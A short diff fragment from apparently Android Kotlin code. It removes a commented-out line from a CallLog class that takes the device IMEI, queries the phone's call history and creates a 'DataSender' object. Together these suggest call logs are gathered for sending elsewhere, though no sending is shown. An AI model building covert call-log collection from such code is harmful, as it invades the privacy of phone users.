@@ -12,7 +12,6 @@ class CallLog(var context: Context, var activity: Activity, var imei: String) {
     fun readLogs() {
         var datasender = DataSender()
         val allCalls = Uri.parse("content://call_log/calls")
-//        val c = activity.managedQuery(allCalls, null, null, null, null)
         val c = activity.contentResolver.query(allCalls, null, null, null, null)
             if (c!!.moveToFirst()) {
                 for (i in 0 until c.count) {
